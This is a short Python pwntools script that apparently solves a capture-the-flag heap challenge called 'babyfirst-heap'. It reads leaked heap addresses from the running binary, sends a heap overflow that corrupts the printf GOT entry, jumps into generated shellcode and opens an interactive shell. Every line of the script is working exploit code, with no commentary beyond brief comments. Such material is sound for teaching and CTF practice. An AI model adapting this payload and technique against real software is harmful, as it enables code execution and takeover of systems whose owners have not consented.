#!/usr/bin/env python2

from pwn import *

# Setup goodies
context(os = 'linux', arch = 'i386')
elf = ELF('./babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c')
rop = ROP(elf)

# Connect and skip header
r = process('./babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c')
r.recvuntil('address.\n')

# Receive the heap locations
addrs = []
for n in range(20):
    r.recvuntil('loc=')
    loc = r.recvuntil(']')[:-1]
    addrs.append(int(loc, 16))
    r.recvline()

# Send heap overflow
r.sendline(flat(
    elf.got['printf'] - 8,
    addrs[10] + 8,
    asm('jmp $ + 8'),
    'AAAAAA',
    asm(shellcraft.sh()),
    'B'*500
))

# GO!
r.clean()
r.interactive()
